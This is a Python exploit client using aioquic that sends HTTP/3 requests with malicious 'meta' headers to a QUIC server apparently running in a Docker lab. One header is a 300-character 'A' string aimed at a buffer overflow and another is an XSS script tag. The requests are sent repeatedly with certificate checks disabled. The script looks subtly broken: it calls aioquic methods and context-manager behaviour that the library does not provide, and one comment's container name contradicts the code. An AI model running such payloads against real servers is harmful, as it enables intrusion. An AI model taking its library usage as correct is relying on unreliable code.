import asyncio
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.connection import QuicConnection
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived

class QuicExploitClient:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.configuration = QuicConfiguration(
            is_client=True,
            alpn_protocols=H3_ALPN,
        )
        # Пока отключаем проверку сертификата для тестов
        # надо подумать как правильно реализовать, а то херня какаято получается
        self.configuration.verify_mode = 0

    async def send_exploit_payload(self, iteration: int):
        try:
            # Создаем соединение
            connection = QuicConnection(configuration=self.configuration)
            await connection.connect(self.host, self.port)
            
            async with connection:
                h3_connection = H3Connection(connection)

                # Формируем вредоносные заголовки
                headers = [
                    (b":method", b"GET"),
                    (b":scheme", b"https"),
                    (b":authority", self.host.encode()),
                    (b":path", b"/"),
                    # Обычный метатег
                    (b"meta", b"normal_tag"),
                    # Длинный метатег для переполнения буфера (300 символов 'A')
                    (b"meta", b"A" * 300),
                    # Метатег с потенциально опасными символами
                    (b"meta", b"exploit<script>alert(1)</script>"),
                ]

                # Отправляем запрос
                stream_id = h3_connection.send_headers(
                    stream_id=connection.get_next_available_stream_id(),
                    headers=headers
                )
                h3_connection.send_data(stream_id=stream_id, data=b"")

                # Получаем ответ
                response = await self.receive_response(h3_connection, stream_id)
                print(f"[{iteration}] Response received ({len(response)} bytes)")

        except Exception as e:
            print(f"[{iteration}] Error: {str(e)}")

    async def receive_response(self, h3_connection, stream_id):
        response = b""
        while True:
            event = h3_connection.next_event()
            if event is None:
                await asyncio.sleep(0.1)
                continue
            if isinstance(event, DataReceived):
                response += event.data
            if event.stream_id == stream_id and event.stream_ended:
                break
        return response

    # здесь вхождение в 10 итераций, но можно и мульт жахнуть
    async def run_exploit(self, times: int = 10):
        tasks = []
        for i in range(times):
            task = asyncio.create_task(self.send_exploit_payload(i))
            tasks.append(task)
            # задержка между запросами
            await asyncio.sleep(0.2)
        
        await asyncio.gather(*tasks)
        print("All requests completed")

if __name__ == "__main__":
    print("QUIC Exploit Client - Sending malicious payloads")
    print("Target: vulnerable QUIC server with buffer overflow in meta tags")
    
    # здесь haCker это имя контейнера Docker, но его можно заменить IP адресом
    client = QuicExploitClient("vsQUIC", 4433)
    asyncio.run(client.run_exploit(times=10))